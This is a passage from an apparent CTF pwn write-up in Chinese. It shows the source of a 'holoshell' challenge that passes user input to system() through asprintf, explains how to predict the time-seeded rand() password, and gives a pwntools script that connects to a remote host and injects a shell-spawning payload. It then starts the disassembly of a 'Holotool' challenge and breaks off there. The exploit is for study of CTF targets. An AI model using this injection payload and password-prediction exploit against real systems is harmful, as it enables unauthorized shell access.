    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
}

void sudo()
{
    char buf[10];
    char *command;
    write(1, "[sudo] password for yagoo: ", 27);
    read(0, buf, 10);
    if (strncmp(buf, passwd, 10) == 0)
    {
        puts("wow you hack into yagoo's computer");
        puts("now you have one chance to write your name to HololiveTW");
        write(1, "> ", 2);
        memset(buf, 0, 10);
        read(0, buf, 10);
        asprintf(&command, "echo \"%s\" >> HololiveTW.txt", buf);
        system(command);
        free(command);
        command = NULL;
    }
    else
    {
        puts("sudo: 1 incorrect password attempt");
    }
}

void parse_command(char *arg)
{
    if (strncmp(arg, "cat", 3) == 0)
    {
        cat();
    }
    else if (strncmp(arg, "ls", 2) == 0)
    {
        ls();
    }
    else if (strncmp(arg, "sudo -s", 7) == 0)
    {
        sudo();
    }
    else if (strncmp(arg, "exit", 4) == 0)
    {
        exit(0);
    }
    else
    {
        puts("holosh: command not found");
    }
}

int main()
{
    char command[0x10];
    init();
    login_info();

    while (1)
    {
        write(1, "yagoo@hololive:~$ ", 18);
        read(0, command, 0x10);
        parse_command(command);
    }

    return 0;
}
```
</details>

**key concept :** <font color = #FF0080 > rand() 種子設定</font>

**突破點 :** 
1. 從C語言中的rand()函數的種子(srand)的方式下手，因為只要種子相同，密碼就相同。
2. 在猜密碼時製作第0秒以及第1秒，因為有時remote的時間一樣，有時會差一秒。
3. 最後密碼正確時，再輸入「\sh」建立一個shell，而分號是要隔開兩邊。
4. payload
```python
from pwn import *
from ctypes import *
context.arch = "amd64"
elf = cdll.LoadLibrary('libc.so.6')
p = process('/share/holoshell')

def make_psw(plus):
    elf.srand(time_base+plus)
    s=""
    for i in range(10):
        s+= chr(33 + (elf.rand() % (126 - 32) + 1))
    return s

time_base=elf.time(0)
passwd_list=[]
passwd_list.append(make_psw(0).encode())	#same as remote
passwd_list.append(make_psw(1).encode())	#remote is 1 second later

p = remote('140.115.59.7',10004)
pause()
p.send("sudo -s".encode())
pause()
p.send(passwd_list[0])		#有時是[0]
pause()
p.send(b"\";\sh ;\"")
p.interactive()
```

## Holotool

<details>
<summary>source code</summary>

```x86asm
holotool      檔案格式 elf64-x86-64


.init 區段的反組譯：

0000000000401000 <_init>:
  401000:	f3 0f 1e fa          	endbr64 
  401004:	48 83 ec 08          	sub    rsp,0x8
  401008:	48 8b 05 e9 2f 00 00 	mov    rax,QWORD PTR [rip+0x2fe9]        # 403ff8 <__gmon_start__>
  40100f:	48 85 c0             	test   rax,rax
  401012:	74 02                	je     401016 <_init+0x16>
  401014:	ff d0                	call   rax
  401016:	48 83 c4 08          	add    rsp,0x8
  40101a:	c3                   	ret    

.plt 區段的反組譯：

0000000000401020 <.plt>:
  401020:	ff 35 e2 2f 00 00    	push   QWORD PTR [rip+0x2fe2]        # 404008 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:	f2 ff 25 e3 2f 00 00 	bnd jmp QWORD PTR [rip+0x2fe3]        # 404010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102d:	0f 1f 00             	nop    DWORD PTR [rax]
  401030:	f3 0f 1e fa          	endbr64 
  401034:	68 00 00 00 00       	push   0x0
  401039:	f2 e9 e1 ff ff ff    	bnd jmp 401020 <.plt>
  40103f:	90                   	nop
  401040:	f3 0f 1e fa          	endbr64 
  401044:	68 01 00 00 00       	push   0x1
  401049:	f2 e9 d1 ff ff ff    	bnd jmp 401020 <.plt>
  40104f:	90                   	nop
  401050:	f3 0f 1e fa          	endbr64 
  401054:	68 02 00 00 00       	push   0x2
  401059:	f2 e9 c1 ff ff ff    	bnd jmp 401020 <.plt>
  40105f:	90                   	nop
  401060:	f3 0f 1e fa          	endbr64 
  401064:	68 03 00 00 00       	push   0x3
  401069:	f2 e9 b1 ff ff ff    	bnd jmp 401020 <.plt>
  40106f:	90                   	nop
  401070:	f3 0f 1e fa          	endbr64 
  401074:	68 04 00 00 00       	push   0x4
  401079:	f2 e9 a1 ff ff ff    	bnd jmp 401020 <.plt>
  40107f:	90                   	nop
  401080:	f3 0f 1e fa          	endbr64 
  401084:	68 05 00 00 00       	push   0x5
  401089:	f2 e9 91 ff ff ff    	bnd jmp 401020 <.plt>
  40108f:	90                   	nop
  401090:	f3 0f 1e fa          	endbr64 
  401094:	68 06 00 00 00       	push   0x6
  401099:	f2 e9 81 ff ff ff    	bnd jmp 401020 <.plt>
  40109f:	90                   	nop

.plt.sec 區段的反組譯：

00000000004010a0 <puts@plt>:
  4010a0:	f3 0f 1e fa          	endbr64 
  4010a4:	f2 ff 25 6d 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f6d]        # 404018 <puts@GLIBC_2.2.5>
  4010ab:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010b0 <write@plt>:
  4010b0:	f3 0f 1e fa          	endbr64 
  4010b4:	f2 ff 25 65 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f65]        # 404020 <write@GLIBC_2.2.5>
  4010bb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010c0 <printf@plt>:
  4010c0:	f3 0f 1e fa          	endbr64 
  4010c4:	f2 ff 25 5d 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f5d]        # 404028 <printf@GLIBC_2.2.5>
  4010cb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010d0 <read@plt>:
  4010d0:	f3 0f 1e fa          	endbr64 
  4010d4:	f2 ff 25 55 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f55]        # 404030 <read@GLIBC_2.2.5>
  4010db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010e0 <setvbuf@plt>:
  4010e0:	f3 0f 1e fa          	endbr64 
  4010e4:	f2 ff 25 4d 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f4d]        # 404038 <setvbuf@GLIBC_2.2.5>
  4010eb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010f0 <atoi@plt>:
  4010f0:	f3 0f 1e fa          	endbr64 
  4010f4:	f2 ff 25 45 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f45]        # 404040 <atoi@GLIBC_2.2.5>
  4010fb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000401100 <exit@plt>:
  401100:	f3 0f 1e fa          	endbr64 
  401104:	f2 ff 25 3d 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f3d]        # 404048 <exit@GLIBC_2.2.5>
  40110b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

.text 區段的反組譯：

0000000000401110 <_start>:
  401110:	f3 0f 1e fa          	endbr64 
  401114:	31 ed                	xor    ebp,ebp
  401116:	49 89 d1             	mov    r9,rdx
  401119:	5e                   	pop    rsi
  40111a:	48 89 e2             	mov    rdx,rsp
  40111d:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
  401121:	50                   	push   rax
  401122:	54                   	push   rsp
  401123:	49 c7 c0 40 19 40 00 	mov    r8,0x401940
  40112a:	48 c7 c1 d0 18 40 00 	mov    rcx,0x4018d0
  401131:	48 c7 c7 f7 17 40 00 	mov    rdi,0x4017f7
  401138:	ff 15 b2 2e 00 00    	call   QWORD PTR [rip+0x2eb2]        # 403ff0 <__libc_start_main@GLIBC_2.2.5>
  40113e:	f4                   	hlt    
  40113f:	90                   	nop

0000000000401140 <_dl_relocate_static_pie>:
  401140:	f3 0f 1e fa          	endbr64 
  401144:	c3                   	ret    
  401145:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
  40114c:	00 00 00 
  40114f:	90                   	nop

0000000000401150 <deregister_tm_clones>:
  401150:	b8 60 40 40 00       	mov    eax,0x404060
  401155:	48 3d 60 40 40 00    	cmp    rax,0x404060
  40115b:	74 13                	je     401170 <deregister_tm_clones+0x20>
  40115d:	b8 00 00 00 00       	mov    eax,0x0
  401162:	48 85 c0             	test   rax,rax
  401165:	74 09                	je     401170 <deregister_tm_clones+0x20>
  401167:	bf 60 40 40 00       	mov    edi,0x404060
  40116c:	ff e0                	jmp    rax
  40116e:	66 90                	xchg   ax,ax
  401170:	c3                   	ret    
  401171:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  401178:	00 00 00 00 
  40117c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000401180 <register_tm_clones>:
  401180:	be 60 40 40 00       	mov    esi,0x404060
  401185:	48 81 ee 60 40 40 00 	sub    rsi,0x404060
  40118c:	48 89 f0             	mov    rax,rsi
  40118f:	48 c1 ee 3f          	shr    rsi,0x3f
  401193:	48 c1 f8 03          	sar    rax,0x3
  401197:	48 01 c6             	add    rsi,rax
  40119a:	48 d1 fe             	sar    rsi,1
  40119d:	74 11                	je     4011b0 <register_tm_clones+0x30>
  40119f:	b8 00 00 00 00       	mov    eax,0x0
  4011a4:	48 85 c0             	test   rax,rax
  4011a7:	74 07                	je     4011b0 <register_tm_clones+0x30>
  4011a9:	bf 60 40 40 00       	mov    edi,0x404060
  4011ae:	ff e0                	jmp    rax
  4011b0:	c3                   	ret    
  4011b1:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  4011b8:	00 00 00 00 
  4011bc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

00000000004011c0 <__do_global_dtors_aux>:
  4011c0:	f3 0f 1e fa          	endbr64 
  4011c4:	80 3d bd 2e 00 00 00 	cmp    BYTE PTR [rip+0x2ebd],0x0        # 404088 <completed.8060>
  4011cb:	75 13                	jne    4011e0 <__do_global_dtors_aux+0x20>
  4011cd:	55                   	push   rbp
  4011ce:	48 89 e5             	mov    rbp,rsp
  4011d1:	e8 7a ff ff ff       	call   401150 <deregister_tm_clones>
  4011d6:	c6 05 ab 2e 00 00 01 	mov    BYTE PTR [rip+0x2eab],0x1        # 404088 <completed.8060>
  4011dd:	5d                   	pop    rbp
  4011de:	c3                   	ret    
  4011df:	90                   	nop
  4011e0:	c3                   	ret    
  4011e1:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  4011e8:	00 00 00 00 
  4011ec:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

00000000004011f0 <frame_dummy>:
  4011f0:	f3 0f 1e fa          	endbr64 
  4011f4:	eb 8a                	jmp    401180 <register_tm_clones>

00000000004011f6 <init>:
  4011f6:	f3 0f 1e fa          	endbr64 
  4011fa:	55                   	push   rbp
  4011fb:	48 89 e5             	mov    rbp,rsp
  4011fe:	48 8b 05 6b 2e 00 00 	mov    rax,QWORD PTR [rip+0x2e6b]        # 404070 <stdin@@GLIBC_2.2.5>
  401205:	b9 00 00 00 00       	mov    ecx,0x0
  40120a:	ba 02 00 00 00       	mov    edx,0x2
  40120f:	be 00 00 00 00       	mov    esi,0x0
  401214:	48 89 c7             	mov    rdi,rax
  401217:	e8 c4 fe ff ff       	call   4010e0 <setvbuf@plt>
  40121c:	48 8b 05 3d 2e 00 00 	mov    rax,QWORD PTR [rip+0x2e3d]        # 404060 <stdout@@GLIBC_2.2.5>
  401223:	b9 00 00 00 00       	mov    ecx,0x0
  401228:	ba 02 00 00 00       	mov    edx,0x2
  40122d:	be 00 00 00 00       	mov    esi,0x0
  401232:	48 89 c7             	mov    rdi,rax
  401235:	e8 a6 fe ff ff       	call   4010e0 <setvbuf@plt>
  40123a:	48 8b 05 3f 2e 00 00 	mov    rax,QWORD PTR [rip+0x2e3f]        # 404080 <stderr@@GLIBC_2.2.5>
  401241:	b9 00 00 00 00       	mov    ecx,0x0
  401246:	ba 02 00 00 00       	mov    edx,0x2
  40124b:	be 00 00 00 00       	mov    esi,0x0
  401250:	48 89 c7             	mov    rdi,rax
  401253:	e8 88 fe ff ff       	call   4010e0 <setvbuf@plt>
  401258:	90                   	nop
  401259:	5d                   	pop    rbp
  40125a:	c3                   	ret    

000000000040125b <banner>:
  40125b:	f3 0f 1e fa          	endbr64 
  40125f:	55                   	push   rbp
  401260:	48 89 e5             	mov    rbp,rsp
  401263:	48 8d 3d 9e 0d 00 00 	lea    rdi,[rip+0xd9e]        # 402008 <_IO_stdin_used+0x8>
  40126a:	e8 31 fe ff ff       	call   4010a0 <puts@plt>
  40126f:	48 8d 3d 9a 0d 00 00 	lea    rdi,[rip+0xd9a]        # 402010 <_IO_stdin_used+0x10>
  401276:	e8 25 fe ff ff       	call   4010a0 <puts@plt>
  40127b:	48 8d 3d de 0d 00 00 	lea    rdi,[rip+0xdde]        # 402060 <_IO_stdin_used+0x60>
  401282:	e8 19 fe ff ff       	call   4010a0 <puts@plt>
  401287:	48 8d 3d 32 0e 00 00 	lea    rdi,[rip+0xe32]        # 4020c0 <_IO_stdin_used+0xc0>
  40128e:	e8 0d fe ff ff       	call   4010a0 <puts@plt>
  401293:	48 8d 3d 9e 0e 00 00 	lea    rdi,[rip+0xe9e]        # 402138 <_IO_stdin_used+0x138>
  40129a:	e8 01 fe ff ff       	call   4010a0 <puts@plt>
  40129f:	48 8d 3d 1a 0f 00 00 	lea    rdi,[rip+0xf1a]        # 4021c0 <_IO_stdin_used+0x1c0>
  4012a6:	e8 f5 fd ff ff       	call   4010a0 <puts@plt>
  4012ab:	48 8d 3d 56 0d 00 00 	lea    rdi,[rip+0xd56]        # 402008 <_IO_stdin_used+0x8>
  4012b2:	e8 e9 fd ff ff       	call   4010a0 <puts@plt>
  4012b7:	90                   	nop
  4012b8:	5d                   	pop    rbp
  4012b9:	c3                   	ret    

00000000004012ba <init_info>:
  4012ba:	f3 0f 1e fa          	endbr64 
  4012be:	55                   	push   rbp
  4012bf:	48 89 e5             	mov    rbp,rsp
  4012c2:	48 b8 47 61 77 72 20 	movabs rax,0x7275472072776147
  4012c9:	47 75 72 
  4012cc:	48 89 05 cd 2d 00 00 	mov    QWORD PTR [rip+0x2dcd],rax        # 4040a0 <vTubers>
  4012d3:	66 c7 05 cc 2d 00 00 	mov    WORD PTR [rip+0x2dcc],0x61        # 4040a8 <vTubers+0x8>
  4012da:	61 00 
  4012dc:	48 b8 68 74 74 70 73 	movabs rax,0x2f2f3a7370747468
  4012e3:	3a 2f 2f 
  4012e6:	48 ba 70 70 74 2e 63 	movabs rdx,0x662f63632e747070
  4012ed:	63 2f 66 
  4012f0:	48 89 05 c9 2d 00 00 	mov    QWORD PTR [rip+0x2dc9],rax        # 4040c0 <vTubers+0x20>
  4012f7:	48 89 15 ca 2d 00 00 	mov    QWORD PTR [rip+0x2dca],rdx        # 4040c8 <vTubers+0x28>
  4012fe:	c7 05 c8 2d 00 00 48 	mov    DWORD PTR [rip+0x2dc8],0x31365448        # 4040d0 <vTubers+0x30>
  401305:	54 36 31 
  401308:	66 c7 05 c3 2d 00 00 	mov    WORD PTR [rip+0x2dc3],0x78        # 4040d4 <vTubers+0x34>
  40130f:	78 00 
  401311:	48 89 05 c8 2d 00 00 	mov    QWORD PTR [rip+0x2dc8],rax        # 4040e0 <vTubers+0x40>
  401318:	48 89 15 c9 2d 00 00 	mov    QWORD PTR [rip+0x2dc9],rdx        # 4040e8 <vTubers+0x48>
  40131f:	c7 05 c7 2d 00 00 48 	mov    DWORD PTR [rip+0x2dc7],0x41325048        # 4040f0 <vTubers+0x50>
  401326:	50 32 41 
  401329:	66 c7 05 c2 2d 00 00 	mov    WORD PTR [rip+0x2dc2],0x78        # 4040f4 <vTubers+0x54>
  401330:	78 00 
  401332:	48 b9 57 61 74 73 6f 	movabs rcx,0x41206e6f73746157
  401339:	6e 20 41 
  40133c:	48 89 0d bd 2d 00 00 	mov    QWORD PTR [rip+0x2dbd],rcx        # 404100 <vTubers+0x60>
  401343:	c7 05 bb 2d 00 00 6d 	mov    DWORD PTR [rip+0x2dbb],0x696c656d        # 404108 <vTubers+0x68>
  40134a:	65 6c 69 
  40134d:	66 c7 05 b6 2d 00 00 	mov    WORD PTR [rip+0x2db6],0x61        # 40410c <vTubers+0x6c>
  401354:	61 00 
  401356:	48 89 05 c3 2d 00 00 	mov    QWORD PTR [rip+0x2dc3],rax        # 404120 <vTubers+0x80>
  40135d:	48 89 15 c4 2d 00 00 	mov    QWORD PTR [rip+0x2dc4],rdx        # 404128 <vTubers+0x88>
  401364:	c7 05 c2 2d 00 00 49 	mov    DWORD PTR [rip+0x2dc2],0x73496149        # 404130 <vTubers+0x90>
  40136b:	61 49 73 
  40136e:	66 c7 05 bd 2d 00 00 	mov    WORD PTR [rip+0x2dbd],0x78        # 404134 <vTubers+0x94>
  401375:	78 00 
  401377:	48 89 05 c2 2d 00 00 	mov    QWORD PTR [rip+0x2dc2],rax        # 404140 <vTubers+0xa0>
  40137e:	48 89 15 c3 2d 00 00 	mov    QWORD PTR [rip+0x2dc3],rdx        # 404148 <vTubers+0xa8>
  401385:	c7 05 c1 2d 00 00 36 	mov    DWORD PTR [rip+0x2dc1],0x4f353736        # 404150 <vTubers+0xb0>
  40138c:	37 35 4f 
  40138f:	66 c7 05 bc 2d 00 00 	mov    WORD PTR [rip+0x2dbc],0x78        # 404154 <vTubers+0xb4>
  401396:	78 00 
  401398:	48 b9 55 72 75 68 61 	movabs rcx,0x7552206168757255
  40139f:	20 52 75 
  4013a2:	48 89 0d b7 2d 00 00 	mov    QWORD PTR [rip+0x2db7],rcx        # 404160 <vTubers+0xc0>
  4013a9:	c7 05 b5 2d 00 00 73 	mov    DWORD PTR [rip+0x2db5],0x61696873        # 404168 <vTubers+0xc8>
  4013b0:	68 69 61 
  4013b3:	c6 05 b2 2d 00 00 00 	mov    BYTE PTR [rip+0x2db2],0x0        # 40416c <vTubers+0xcc>
  4013ba:	48 89 05 bf 2d 00 00 	mov    QWORD PTR [rip+0x2dbf],rax        # 404180 <vTubers+0xe0>
  4013c1:	48 89 15 c0 2d 00 00 	mov    QWORD PTR [rip+0x2dc0],rdx        # 404188 <vTubers+0xe8>
  4013c8:	c7 05 be 2d 00 00 59 	mov    DWORD PTR [rip+0x2dbe],0x72784359        # 404190 <vTubers+0xf0>
  4013cf:	43 78 72 
  4013d2:	66 c7 05 b9 2d 00 00 	mov    WORD PTR [rip+0x2db9],0x78        # 404194 <vTubers+0xf4>
  4013d9:	78 00 
  4013db:	48 89 05 be 2d 00 00 	mov    QWORD PTR [rip+0x2dbe],rax        # 4041a0 <vTubers+0x100>
  4013e2:	48 89 15 bf 2d 00 00 	mov    QWORD PTR [rip+0x2dbf],rdx        # 4041a8 <vTubers+0x108>
  4013e9:	c7 05 bd 2d 00 00 34 	mov    DWORD PTR [rip+0x2dbd],0x364b6434        # 4041b0 <vTubers+0x110>
  4013f0:	64 4b 36 
  4013f3:	66 c7 05 b8 2d 00 00 	mov    WORD PTR [rip+0x2db8],0x78        # 4041b4 <vTubers+0x114>
  4013fa:	78 00 
  4013fc:	48 be 55 73 61 64 61 	movabs rsi,0x6550206164617355
  401403:	20 50 65 
  401406:	48 89 35 b3 2d 00 00 	mov    QWORD PTR [rip+0x2db3],rsi        # 4041c0 <vTubers+0x120>
  40140d:	c7 05 b1 2d 00 00 6b 	mov    DWORD PTR [rip+0x2db1],0x61726f6b        # 4041c8 <vTubers+0x128>
  401414:	6f 72 61 
  401417:	c6 05 ae 2d 00 00 00 	mov    BYTE PTR [rip+0x2dae],0x0        # 4041cc <vTubers+0x12c>
  40141e:	48 89 05 bb 2d 00 00 	mov    QWORD PTR [rip+0x2dbb],rax        # 4041e0 <vTubers+0x140>
  401425:	48 89 15 bc 2d 00 00 	mov    QWORD PTR [rip+0x2dbc],rdx        # 4041e8 <vTubers+0x148>
  40142c:	c7 05 ba 2d 00 00 48 	mov    DWORD PTR [rip+0x2dba],0x44506448        # 4041f0 <vTubers+0x150>
  401433:	64 50 44 
  401436:	66 c7 05 b5 2d 00 00 	mov    WORD PTR [rip+0x2db5],0x78        # 4041f4 <vTubers+0x154>
  40143d:	78 00 
  40143f:	48 89 05 ba 2d 00 00 	mov    QWORD PTR [rip+0x2dba],rax        # 404200 <vTubers+0x160>
  401446:	48 89 15 bb 2d 00 00 	mov    QWORD PTR [rip+0x2dbb],rdx        # 404208 <vTubers+0x168>
  40144d:	c7 05 b9 2d 00 00 71 	mov    DWORD PTR [rip+0x2db9],0x53566271        # 404210 <vTubers+0x170>
  401454:	62 56 53 
  401457:	66 c7 05 b4 2d 00 00 	mov    WORD PTR [rip+0x2db4],0x78        # 404214 <vTubers+0x174>
  40145e:	78 00 
  401460:	48 be 53 68 69 72 61 	movabs rsi,0x6d616b6172696853
  401467:	6b 61 6d 
  40146a:	48 bf 69 20 46 75 62 	movabs rdi,0x696b756275462069
  401471:	75 6b 69 
  401474:	48 89 35 a5 2d 00 00 	mov    QWORD PTR [rip+0x2da5],rsi        # 404220 <vTubers+0x180>
  40147b:	48 89 3d a6 2d 00 00 	mov    QWORD PTR [rip+0x2da6],rdi        # 404228 <vTubers+0x188>
  401482:	c6 05 a7 2d 00 00 00 	mov    BYTE PTR [rip+0x2da7],0x0        # 404230 <vTubers+0x190>
  401489:	48 89 05 b0 2d 00 00 	mov    QWORD PTR [rip+0x2db0],rax        # 404240 <vTubers+0x1a0>
  401490:	48 89 15 b1 2d 00 00 	mov    QWORD PTR [rip+0x2db1],rdx        # 404248 <vTubers+0x1a8>
  401497:	c7 05 af 2d 00 00 47 	mov    DWORD PTR [rip+0x2daf],0x43553547        # 404250 <vTubers+0x1b0>
  40149e:	35 55 43 
  4014a1:	66 c7 05 aa 2d 00 00 	mov    WORD PTR [rip+0x2daa],0x78        # 404254 <vTubers+0x1b4>
  4014a8:	78 00 
  4014aa:	48 89 05 af 2d 00 00 	mov    QWORD PTR [rip+0x2daf],rax        # 404260 <vTubers+0x1c0>
  4014b1:	48 89 15 b0 2d 00 00 	mov    QWORD PTR [rip+0x2db0],rdx        # 404268 <vTubers+0x1c8>
  4014b8:	c7 05 ae 2d 00 00 6d 	mov    DWORD PTR [rip+0x2dae],0x5550456d        # 404270 <vTubers+0x1d0>
  4014bf:	45 50 55 
  4014c2:	66 c7 05 a9 2d 00 00 	mov    WORD PTR [rip+0x2da9],0x78        # 404274 <vTubers+0x1d4>
  4014c9:	78 00 
  4014cb:	90                   	nop
  4014cc:	5d                   	pop    rbp
  4014cd:	c3                   	ret    

00000000004014ce <read_int>:
  4014ce:	f3 0f 1e fa          	endbr64 
  4014d2:	55                   	push   rbp
  4014d3:	48 89 e5             	mov    rbp,rsp
  4014d6:	48 83 ec 10          	sub    rsp,0x10
  4014da:	48 8d 45 f0          	lea    rax,[rbp-0x10]
  4014de:	ba 10 00 00 00       	mov    edx,0x10
  4014e3:	48 89 c6             	mov    rsi,rax
  4014e6:	bf 00 00 00 00       	mov    edi,0x0
  4014eb:	e8 e0 fb ff ff       	call   4010d0 <read@plt>
  4014f0:	48 8d 45 f0          	lea    rax,[rbp-0x10]
  4014f4:	48 89 c7             	mov    rdi,rax
  4014f7:	e8 f4 fb ff ff       	call   4010f0 <atoi@plt>
  4014fc:	c9                   	leave  
  4014fd:	c3                   	ret    

00000000004014fe <show_info>:
  4014fe:	f3 0f 1e fa          	endbr64 
  401502:	55                   	push   rbp
  401503:	48 89 e5             	mov    rbp,rsp
  401506:	48 83 ec 10          	sub    rsp,0x10
  40150a:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401511:	48 8d 3d 20 0d 00 00 	lea    rdi,[rip+0xd20]        # 402238 <_IO_stdin_used+0x238>
  401518:	e8 83 fb ff ff       	call   4010a0 <puts@plt>
  40151d:	ba 05 00 00 00       	mov    edx,0x5
  401522:	48 8d 35 43 0d 00 00 	lea    rsi,[rip+0xd43]        # 40226c <_IO_stdin_used+0x26c>
  401529:	bf 01 00 00 00       	mov    edi,0x1
  40152e:	e8 7d fb ff ff       	call   4010b0 <write@plt>
  401533:	b8 00 00 00 00       	mov    eax,0x0
  401538:	e8 91 ff ff ff       	call   4014ce <read_int>
  40153d:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax
  401540:	83 7d fc 04          	cmp    DWORD PTR [rbp-0x4],0x4
  401544:	7e 11                	jle    401557 <show_info+0x59>
  401546:	48 8d 3d 25 0d 00 00 	lea    rdi,[rip+0xd25]        # 402272 <_IO_stdin_used+0x272>
  40154d:	e8 4e fb ff ff       	call   4010a0 <puts@plt>
  401552:	e9 9b 00 00 00       	jmp    4015f2 <show_info+0xf4>
  401557:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40155a:	48 63 d0             	movsxd rdx,eax
  40155d:	48 89 d0             	mov    rax,rdx
  401560:	48 01 c0             	add    rax,rax
  401563:	48 01 d0             	add    rax,rdx
  401566:	48 c1 e0 05          	shl    rax,0x5
  40156a:	48 8d 15 2f 2b 00 00 	lea    rdx,[rip+0x2b2f]        # 4040a0 <vTubers>
  401571:	48 01 d0             	add    rax,rdx
  401574:	48 89 c6             	mov    rsi,rax
  401577:	48 8d 3d 04 0d 00 00 	lea    rdi,[rip+0xd04]        # 402282 <_IO_stdin_used+0x282>
  40157e:	b8 00 00 00 00       	mov    eax,0x0
  401583:	e8 38 fb ff ff       	call   4010c0 <printf@plt>
  401588:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40158b:	48 63 d0             	movsxd rdx,eax
  40158e:	48 89 d0             	mov    rax,rdx
  401591:	48 01 c0             	add    rax,rax
  401594:	48 01 d0             	add    rax,rdx
  401597:	48 c1 e0 05          	shl    rax,0x5
  40159b:	48 8d 50 20          	lea    rdx,[rax+0x20]
  40159f:	48 8d 05 fa 2a 00 00 	lea    rax,[rip+0x2afa]        # 4040a0 <vTubers>
  4015a6:	48 01 d0             	add    rax,rdx
  4015a9:	48 89 c6             	mov    rsi,rax
  4015ac:	48 8d 3d d9 0c 00 00 	lea    rdi,[rip+0xcd9]        # 40228c <_IO_stdin_used+0x28c>
  4015b3:	b8 00 00 00 00       	mov    eax,0x0
  4015b8:	e8 03 fb ff ff       	call   4010c0 <printf@plt>
  4015bd:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4015c0:	48 63 d0             	movsxd rdx,eax
  4015c3:	48 89 d0             	mov    rax,rdx
  4015c6:	48 01 c0             	add    rax,rax
  4015c9:	48 01 d0             	add    rax,rdx
  4015cc:	48 c1 e0 05          	shl    rax,0x5
  4015d0:	48 8d 50 40          	lea    rdx,[rax+0x40]
  4015d4:	48 8d 05 c5 2a 00 00 	lea    rax,[rip+0x2ac5]        # 4040a0 <vTubers>
  4015db:	48 01 d0             	add    rax,rdx
  4015de:	48 89 c6             	mov    rsi,rax
  4015e1:	48 8d 3d b4 0c 00 00 	lea    rdi,[rip+0xcb4]        # 40229c <_IO_stdin_used+0x29c>
  4015e8:	b8 00 00 00 00       	mov    eax,0x0
  4015ed:	e8 ce fa ff ff       	call   4010c0 <printf@plt>
  4015f2:	c9                   	leave  
  4015f3:	c3                   	ret    

00000000004015f4 <edit_info>:
  4015f4:	f3 0f 1e fa          	endbr64 
  4015f8:	55                   	push   rbp
  4015f9:	48 89 e5             	mov    rbp,rsp
  4015fc:	48 83 ec 30          	sub    rsp,0x30
  401600:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401607:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  40160e:	48 8d 3d 9b 0c 00 00 	lea    rdi,[rip+0xc9b]        # 4022b0 <_IO_stdin_used+0x2b0>
  401615:	e8 86 fa ff ff       	call   4010a0 <puts@plt>
  40161a:	ba 05 00 00 00       	mov    edx,0x5
  40161f:	48 8d 35 46 0c 00 00 	lea    rsi,[rip+0xc46]        # 40226c <_IO_stdin_used+0x26c>
  401626:	bf 01 00 00 00       	mov    edi,0x1
  40162b:	e8 80 fa ff ff       	call   4010b0 <write@plt>
  401630:	b8 00 00 00 00       	mov    eax,0x0
  401635:	e8 94 fe ff ff       	call   4014ce <read_int>
  40163a:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax
  40163d:	83 7d fc 04          	cmp    DWORD PTR [rbp-0x4],0x4
  401641:	7e 11                	jle    401654 <edit_info+0x60>
  401643:	48 8d 3d 28 0c 00 00 	lea    rdi,[rip+0xc28]        # 402272 <_IO_stdin_used+0x272>
  40164a:	e8 51 fa ff ff       	call   4010a0 <puts@plt>
  40164f:	e9 a1 01 00 00       	jmp    4017f5 <edit_info+0x201>
  401654:	48 8d 3d 89 0c 00 00 	lea    rdi,[rip+0xc89]        # 4022e4 <_IO_stdin_used+0x2e4>
  40165b:	e8 40 fa ff ff       	call   4010a0 <puts@plt>
  401660:	48 8d 3d 96 0c 00 00 	lea    rdi,[rip+0xc96]        # 4022fd <_IO_stdin_used+0x2fd>
  401667:	e8 34 fa ff ff       	call   4010a0 <puts@plt>
